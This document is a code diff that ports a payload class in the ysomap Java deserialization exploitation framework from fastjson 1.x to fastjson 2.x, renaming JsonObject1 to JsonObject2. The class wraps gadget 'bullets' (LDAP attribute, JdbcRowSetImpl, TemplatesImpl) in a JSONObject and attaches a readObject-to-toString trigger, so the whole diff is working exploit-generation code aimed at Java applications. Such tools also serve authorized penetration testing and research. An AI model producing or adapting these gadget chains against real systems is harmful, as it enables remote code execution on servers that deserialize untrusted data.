@@ -1,14 +1,11 @@
 package ysomap.payloads.java.fastjson;
 
-import com.alibaba.fastjson.JSONObject;
+import com.alibaba.fastjson2.JSONObject;
 import ysomap.bullets.Bullet;
 import ysomap.bullets.jdk.LdapAttributeBullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.PayloadHelper;
 import ysomap.payloads.AbstractPayload;
-
-import java.util.ArrayList;
-import java.util.List;
 
 /**
  * @author wh1t3p1g
@@ -19,8 +16,8 @@ import java.util.List;
 @Authors({ Authors.WH1T3P1G })
 @Targets({Targets.JDK, Targets.JNDI})
 @Require(bullets = {"LdapAttributeBullet", "JdbcRowSetImplBullet", "TemplatesImplBullet"}, param = false)
-@Dependencies({"fastjson"})
-public class JsonObject1 extends AbstractPayload<Object> {
+@Dependencies({"fastjson 2.x"})
+public class JsonObject2 extends AbstractPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
@@ -29,11 +26,8 @@ public class JsonObject1 extends AbstractPayload<Object> {
 
     @Override
     public Object pack(Object obj) throws Exception {
-        List<Object> arrays = new ArrayList<>();
-        arrays.add(obj);
-        JSONObject map = new JSONObject(); // also JSONArray
+        JSONObject map = new JSONObject();
         map.put("ysomap", obj);
-        arrays.add(PayloadHelper.makeReadObjectToStringTrigger(map));
-        return arrays;
+        return PayloadHelper.makeReadObjectToStringTrigger(map);
     }
 }
